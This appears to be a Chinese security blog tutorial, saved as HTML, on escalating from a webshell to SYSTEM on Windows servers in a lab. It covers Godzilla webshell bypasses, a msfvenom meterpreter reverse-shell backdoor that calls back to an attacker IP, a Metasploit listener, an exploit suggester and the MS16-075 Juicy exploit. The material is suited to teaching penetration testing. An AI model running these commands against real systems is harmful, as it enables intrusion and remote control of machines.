@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>础篇-工具简单复现 | Windows权限提升基础篇</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@础篇-工具简单复现 | Windows权限提升基础篇 - Hzhsec home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/1.%E5%9F%BA%E7%A1%80%E7%AF%87/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://www.hzhsec.top//index.xml" title="Hzhsec home">
+
+    
+
+
+    <meta property="og:title" content="础篇-工具简单复现 | Windows权限提升基础篇" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/1.%E5%9F%BA%E7%A1%80%E7%AF%87/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2025-11-16T16:00:00+08:00" />
+<meta property="article:modified_time" content="2025-11-16T16:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="础篇-工具简单复现 | Windows权限提升基础篇"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://www.hzhsec.top/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "础篇-工具简单复现 | Windows权限提升基础篇",
+      "item": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/1.%E5%9F%BA%E7%A1%80%E7%AF%87/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "础篇-工具简单复现 | Windows权限提升基础篇",
+  "name": "础篇-工具简单复现 | Windows权限提升基础篇",
+  "description": "",
+  "keywords": [
+    "提权", "MSF", "Windows", "CS", "Docker", "Exploit", "内网"
+  ],
+  "articleBody": "1. Web 到 Windows 系统提权 本文围绕 从WEB SHELL / WEB执行权限 → Windows系统本地提权 的基础流程展开，重点关注：\n平台差异 → 语言差异 → 用户权限 → 工具复现 → 自动化提权 → Exploit利用\n1.1 平台 Web 搭建平台影响权限与执行能力，通常分为：\n类型 代表工具/技术 特性 对提权影响 集成环境 宝塔、PhpStudy、XAMMP 一键化、省心 常见弱配置，易利用 自行搭建 手动安装 Apache / PHP / MySQL 可控性高 安全性取决于管理员水平 虚拟化 Docker、ESXi、QEMU、Hyper-V 依赖宿主机与虚拟化隔离 存在容器逃逸风险 补充知识：\nWeb运行权限多数继承服务启动用户 大部分 WebShell 初始权限为 低权限匿名运行账户 容器化场景需考虑 逃逸攻击面 1.2 Web 开发语言权限差异 不同语言在 Windows 生态下的权限等级存在显著差异：\n语言 权限倾向 原因 JSP 权限高 运行在 Tomcat，可能以高权限服务用户运行 ASP.NET 中高权限 结合 IIS ApplicationPool，部分配置可能为高权限 ASP = PHP 通常低权限 通常属于 IIS / Apache 普通 Web 用户 权限强弱总结：\nJSP \u003e ASP.NET \u003e ASP = PHP 1.3 系统用户权限差异 系统权限的认知会直接影响提权方向与利用工具策略。\nWindows 权限分级 用户/组 权限说明 SYSTEM 系统级最高权限 (0级) Administrators 管理员组，完全控制 Power Users 部分高级权限，低于管理员 Users 普通用户、功能受限 Guests 仅访问无修改操作 Backup Operators 具备备份恢复能力，可间接提权 IIS_IUSRS Web相关服务运行账户 补充重点：Backup Operators 存在可利用攻击面（如使用 diskshadow）\nLinux 用户权限 系统用户：UID 0–999 普通用户：UID \u003e= 1000 ROOT：UID = 0，最高权限 2. 系统提权案例 以下为不同场景下的工具与漏洞利用路径。\n2.1 宝塔面板 - 哥斯拉 + MSF 复现环境：\nWindows Server 2012 (宝塔 + Apache + PHP)\n提权方式使用 MSF + 哥斯拉(冰蝎同类)\n基础流程：\nPMeterpreter BypassOpenBaseDir BypassDisableFunction 补充：\n如果 PHP 中 disable_functions 全部关闭，可利用 FFI、LD_PRELOAD、DLL Hijack、COM组件利用 继续执行命令。\n2.2 溢出漏洞利用 - MSF / CS 复现环境：\nWindows Server 2008 (IIS + ASP) - MSF 搭建方式：\n可使用 Windows Server 2016 手动安装 IIS + ASP 支持 2.2.1 MSF 环境准备 MSF 最新版存在不稳定情况，建议使用 6.4.0 稳定镜像。\nDocker 安装 MSF 拉取镜像\ndocker pull metasploitframework/metasploit-framework:6.4.0 启动并映射配置\ndocker run --rm -it \\ --name msf-6-4 \\ -v ~/.msf4:/root/.msf4 \\ -p 3333:3333 \\ metasploitframework/metasploit-framework:6.4.0 /bin/bash 3️⃣ 进入 MSF\nmsfconsole 📌 补充建议： 如需对外通信，可使用：\n--network=host 2.2.2 生成反弹后门 ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o msf.exe 2.2.3 配置监听并接收会话 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 0.0.0.0 set lport 3333 exploit -j -z 会话转后台：\nbackground 2.2.4 自动化漏洞扫描 (EXP Suggester) use post/multi/recon/local_exploit_suggester set showdescription true set session 1 run 2.2.5 漏洞溢出提权 示例使用：\nuse exploit/windows/local/ms16_075_reflection_juicy set session 1 exploit 若监听端口异常：\nset LHOST 172.27.28.12 set LPORT 3333 set Payload windows/meterpreter/reverse_tcp set SESSION 2 set VERBOSE true exploit ",
+  "wordCount" : "299",
+  "inLanguage": "en",
+  "datePublished": "2025-11-16T16:00:00+08:00",
+  "dateModified": "2025-11-16T16:00:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/1.%E5%9F%BA%E7%A1%80%E7%AF%87/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsec home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://www.hzhsec.top/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/static/hzhsec.png">
+
+<link rel="manifest" href="/static/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>础篇-工具简单复现 | Windows权限提升基础篇</h1>
+  </header>
+
+  <p>
+  <small>
+    November 16, 2025&nbsp;· 299 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#11-平台">1.1 平台</a></li>
+    <li><a href="#12-web-开发语言权限差异">1.2 Web 开发语言权限差异</a></li>
+    <li><a href="#13-系统用户权限差异">1.3 系统用户权限差异</a>
+      <ul>
+        <li><a href="#windows-权限分级">Windows 权限分级</a></li>
+        <li><a href="#linux-用户权限">Linux 用户权限</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#21-宝塔面板---哥斯拉--msf">2.1 宝塔面板 - 哥斯拉 + MSF</a></li>
+    <li><a href="#22-溢出漏洞利用---msf--cs">2.2 溢出漏洞利用 - MSF / CS</a></li>
+    <li><a href="#221-msf-环境准备">2.2.1 MSF 环境准备</a>
+      <ul>
+        <li><a href="#docker-安装-msf">Docker 安装 MSF</a></li>
+      </ul>
+    </li>
+    <li><a href="#222-生成反弹后门">2.2.2 生成反弹后门</a></li>
+    <li><a href="#223-配置监听并接收会话">2.2.3 配置监听并接收会话</a></li>
+    <li><a href="#224-自动化漏洞扫描-exp-suggester">2.2.4 自动化漏洞扫描 (EXP Suggester)</a></li>
+    <li><a href="#225-漏洞溢出提权">2.2.5 漏洞溢出提权</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h1 id="1-web-到-windows-系统提权">1. Web 到 Windows 系统提权</h1>
+<p>本文围绕 <strong>从WEB SHELL / WEB执行权限 → Windows系统本地提权</strong> 的基础流程展开，重点关注：<br>
+<strong>平台差异 → 语言差异 → 用户权限 → 工具复现 → 自动化提权 → Exploit利用</strong></p>
+<hr>
+<h2 id="11-平台">1.1 平台</h2>
+<p>Web 搭建平台影响权限与执行能力，通常分为：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>代表工具/技术</th>
+<th>特性</th>
+<th>对提权影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>集成环境</td>
+<td>宝塔、PhpStudy、XAMMP</td>
+<td>一键化、省心</td>
+<td>常见弱配置，易利用</td>
+</tr>
+<tr>
+<td>自行搭建</td>
+<td>手动安装 Apache / PHP / MySQL</td>
+<td>可控性高</td>
+<td>安全性取决于管理员水平</td>
+</tr>
+<tr>
+<td>虚拟化</td>
+<td>Docker、ESXi、QEMU、Hyper-V</td>
+<td>依赖宿主机与虚拟化隔离</td>
+<td>存在容器逃逸风险</td>
+</tr>
+</tbody>
+</table>
+<p><strong>补充知识：</strong></p>
+<ul>
+<li>Web运行权限多数继承服务启动用户</li>
+<li>大部分 WebShell 初始权限为 <strong>低权限匿名运行账户</strong></li>
+<li>容器化场景需考虑 <strong>逃逸攻击面</strong></li>
+</ul>
+<hr>
+<h2 id="12-web-开发语言权限差异">1.2 Web 开发语言权限差异</h2>
+<p>不同语言在 Windows 生态下的权限等级存在显著差异：</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>权限倾向</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JSP</td>
+<td>权限高</td>
+<td>运行在 Tomcat，可能以高权限服务用户运行</td>
+</tr>
+<tr>
+<td>ASP.NET</td>
+<td>中高权限</td>
+<td>结合 IIS ApplicationPool，部分配置可能为高权限</td>
+</tr>
+<tr>
+<td>ASP = PHP</td>
+<td>通常低权限</td>
+<td>通常属于 IIS / Apache 普通 Web 用户</td>
+</tr>
+</tbody>
+</table>
+<p>权限强弱总结：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JSP &gt; ASP.NET &gt; ASP = PHP
+</span></span></code></pre></div><hr>
+<h2 id="13-系统用户权限差异">1.3 系统用户权限差异</h2>
+<p>系统权限的认知会直接影响提权方向与利用工具策略。</p>
+<h3 id="windows-权限分级">Windows 权限分级</h3>
+<table>
+<thead>
+<tr>
+<th>用户/组</th>
+<th>权限说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SYSTEM</td>
+<td>系统级最高权限 (0级)</td>
+</tr>
+<tr>
+<td>Administrators</td>
+<td>管理员组，完全控制</td>
+</tr>
+<tr>
+<td>Power Users</td>
+<td>部分高级权限，低于管理员</td>
+</tr>
+<tr>
+<td>Users</td>
+<td>普通用户、功能受限</td>
+</tr>
+<tr>
+<td>Guests</td>
+<td>仅访问无修改操作</td>
+</tr>
+<tr>
+<td>Backup Operators</td>
+<td>具备备份恢复能力，可间接提权</td>
+</tr>
+<tr>
+<td>IIS_IUSRS</td>
+<td>Web相关服务运行账户</td>
+</tr>
+</tbody>
+</table>
+<p><strong>补充重点：Backup Operators 存在可利用攻击面（如使用 diskshadow）</strong></p>
+<h3 id="linux-用户权限">Linux 用户权限</h3>
+<ul>
+<li>系统用户：UID 0–999</li>
+<li>普通用户：UID &gt;= 1000</li>
+<li>ROOT：UID = 0，最高权限</li>
+</ul>
+<hr>
+<h1 id="2-系统提权案例">2. 系统提权案例</h1>
+<p>以下为不同场景下的工具与漏洞利用路径。</p>
+<hr>
+<h2 id="21-宝塔面板---哥斯拉--msf">2.1 宝塔面板 - 哥斯拉 + MSF</h2>
+<p>复现环境：</p>
+<p><strong>Windows Server 2012 (宝塔 + Apache + PHP)</strong><br>
+提权方式使用 <strong>MSF + 哥斯拉(冰蝎同类)</strong></p>
+<p>基础流程：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PMeterpreter
+</span></span><span style="display:flex;"><span>BypassOpenBaseDir
+</span></span><span style="display:flex;"><span>BypassDisableFunction
+</span></span></code></pre></div><p><strong>补充：</strong><br>
+如果 PHP 中 <code>disable_functions</code> 全部关闭，可利用 <strong>FFI、LD_PRELOAD、DLL Hijack、COM组件利用</strong> 继续执行命令。</p>
+<hr>
+<h2 id="22-溢出漏洞利用---msf--cs">2.2 溢出漏洞利用 - MSF / CS</h2>
+<p>复现环境：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Windows Server 2008 (IIS + ASP) - MSF
+</span></span></code></pre></div><p>搭建方式：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>可使用 Windows Server 2016 手动安装 IIS + ASP 支持
+</span></span></code></pre></div><hr>
+<h2 id="221-msf-环境准备">2.2.1 MSF 环境准备</h2>
+<p>MSF 最新版存在不稳定情况，建议使用 <strong>6.4.0</strong> 稳定镜像。</p>
+<h3 id="docker-安装-msf">Docker 安装 MSF</h3>
+<p>拉取镜像</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker pull metasploitframework/metasploit-framework:6.4.0
+</span></span></code></pre></div><p>启动并映射配置</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run --rm -it <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --name msf-6-4 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -v ~/.msf4:/root/.msf4 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p 3333:3333 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  metasploitframework/metasploit-framework:6.4.0 /bin/bash
+</span></span></code></pre></div><p>3️⃣ 进入 MSF</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
+</span></span></code></pre></div><p>📌 补充建议：
+如需对外通信，可使用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>--network=host
+</span></span></code></pre></div><hr>
+<h2 id="222-生成反弹后门">2.2.2 生成反弹后门</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>172.27.28.12 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">3333</span> -f exe -o msf.exe
+</span></span></code></pre></div><hr>
+<h2 id="223-配置监听并接收会话">2.2.3 配置监听并接收会话</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/multi/handler
+</span></span><span style="display:flex;"><span>set payload windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>set lhost 0.0.0.0
+</span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">3333</span>
+</span></span><span style="display:flex;"><span>exploit -j -z
+</span></span></code></pre></div><p>会话转后台：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>background
+</span></span></code></pre></div><hr>
+<h2 id="224-自动化漏洞扫描-exp-suggester">2.2.4 自动化漏洞扫描 (EXP Suggester)</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>set showdescription true
+</span></span><span style="display:flex;"><span>set session <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>run
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251013181645.png" alt="Pasted image 20251013181645.png"></p>
+<hr>
+<h2 id="225-漏洞溢出提权">2.2.5 漏洞溢出提权</h2>
+<p>示例使用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/windows/local/ms16_075_reflection_juicy
+</span></span><span style="display:flex;"><span>set session <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>若监听端口异常：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set LHOST 172.27.28.12
+</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">3333</span>
+</span></span><span style="display:flex;"><span>set Payload windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>set SESSION <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>set VERBOSE true
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-13 182005.png" alt="屏幕截图 2025-10-13 182005.png"></p></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/1.%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>内核溢出漏洞提权</span></a>
+    
+    
+    <a class="next" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/4.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83/"><span>计算机用户提权</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
